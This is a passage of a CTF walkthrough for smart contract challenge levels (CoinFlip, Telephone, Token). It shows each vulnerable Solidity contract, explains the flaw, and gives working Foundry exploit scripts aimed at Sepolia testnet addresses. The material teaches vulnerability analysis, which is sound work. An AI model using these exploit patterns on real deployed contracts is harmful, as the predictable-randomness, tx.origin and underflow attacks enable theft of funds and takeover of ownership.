<span>    lastHash </span><span class="token" style="color:#d4d4d4">=</span><span> blockValue</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> coinFlip </span><span class="token" style="color:#d4d4d4">=</span><span> blockValue </span><span class="token" style="color:#d4d4d4">/</span><span> FACTOR</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bool</span><span> side </span><span class="token" style="color:#d4d4d4">=</span><span> coinFlip </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">1</span><span> </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#569cd6">true</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>side </span><span class="token" style="color:#d4d4d4">==</span><span> _guess</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      consecutiveWins</span><span class="token" style="color:#d4d4d4">++</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      consecutiveWins </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We have to make the <code>consecutiveWins</code> to 10. We need to guess the coin flip consecutives 10 times.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>We can implement the same logic which is used to find the <code>side</code> of the coin in the <code>CoinFlip</code> contract.</li>
<li>I wrote a player contract which will perform the <code>flip()</code> calculation and sends the value to the <code>CoinFlip</code> contract.</li>
<li>Since the entire computaion in both contracts happens in same transaction, the <code>block.hash</code> and <code>block.number</code> remains same in both contracts.</li>
<li>But we need to run the player script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.</li>
</ol>
<p><strong>Level3Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level3.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">player</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">constant</span><span> FACTOR </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>     </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span>CoinFlip _coinflipInstance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">uint256</span><span> blockValue </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">blockhash</span><span class="token" style="color:#d4d4d4">(</span><span>block</span><span class="token" style="color:#d4d4d4">.</span><span>number </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">uint256</span><span> coinFlip </span><span class="token" style="color:#d4d4d4">=</span><span> blockValue </span><span class="token" style="color:#d4d4d4">/</span><span> FACTOR</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">bool</span><span> side </span><span class="token" style="color:#d4d4d4">=</span><span> coinFlip </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">1</span><span> </span><span class="token" style="color:#d4d4d4">?</span><span> </span><span class="token" style="color:#569cd6">true</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            _coinflipInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">flip</span><span class="token" style="color:#d4d4d4">(</span><span>side</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>     </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level3Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    CoinFlip </span><span class="token" style="color:#569CD6">public</span><span> level3 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">CoinFlip</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x4d03165ffad46794329037004988b6De42AaC4DB</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span class="token" style="color:#6a9955">//pass the contract address deployed on the sepolia testnet</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">player</span><span class="token" style="color:#d4d4d4">(</span><span>level3</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;consecutive wins:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>level3</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">consecutiveWins</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level3Solution.s.sol:Level3Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Telephone</h2>
<p><strong>Level4.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Telephone</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">changeOwner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _owner</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin </span><span class="token" style="color:#d4d4d4">!=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      owner </span><span class="token" style="color:#d4d4d4">=</span><span> _owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong> Claim the ownership of the Telephone contract</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>If the <code>msg.sender</code> is equals to <code>tx.origin</code> which means the call was from a EOA. If its not, then the call is from a contract.</li>
<li>To bypass that check, I have an written an intermediary contract which will call the <code>changeOwner()</code> function.</li>
<li>Thus <code>msg.sender</code> is our intermediary contract and <code>tx.origin</code> is our EOA.</li>
<li>Simply call the <code>changeOwner()</code> function from the intermediary contract.</li>
</ol>
<p><strong>Level4Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level4.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">IntermediatoryContract</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span>Telephone _telephoneInstance</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> _newOwner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        _telephoneInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">changeOwner</span><span class="token" style="color:#d4d4d4">(</span><span>_newOwner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level4Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Telephone </span><span class="token" style="color:#569CD6">public</span><span> level4 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Telephone</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x7Ca95d4b9f0a67539f9A3586e895C67547c76190</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">IntermediatoryContract</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>        level4</span><span class="token" style="color:#d4d4d4">,</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envAddress</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY_ADDRESS&quot;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level4Solution.s.sol:Level4Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Token</h2>
<p><strong>Level5.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.6.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">//objectives :</span><span>
</span><span></span><span class="token" style="color:#6a9955">//1.take more than 20 tokens</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Token</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> balances</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> </span><span class="token" style="color:#569CD6">public</span><span> totalSupply</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> totalSupply </span><span class="token" style="color:#d4d4d4">=</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> _value</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> _value </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-=</span><span> _value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>_to</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> _value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _owner</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> balance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> balances</span><span class="token" style="color:#d4d4d4">[</span><span>_owner</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We have initial token balance of 20, we need to take more than 20 tokens.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>This contract uses solidity pragma <code>0.6.0</code>, in which no arithmetic overflow/underflow checks are not performed by default.</li>
<li>In <code>transfer()</code> function the require check can be bypassed when we pass value as more than 20.</li>
<li>20 - 21 = -1 which results in <code>2**256 - 1</code>. Which is <code>&gt;= 0</code> and the same will happens in the update of balance at sender.</li>
<li><code>balances[msg.sender] -= _value;</code> will become balance[msg.sender] = 20 - 21 = 2**256 -1.</li>
</ol>
<p><strong>Level5Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.6.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level5.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level5Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Token </span><span class="token" style="color:#569CD6">public</span><span> level5 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Token</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xf363A66580c0E202396333d08Fc53e18cbcc625F</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;total supply:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>level5</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">totalSupply</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    level5</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#b5cea8">21</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
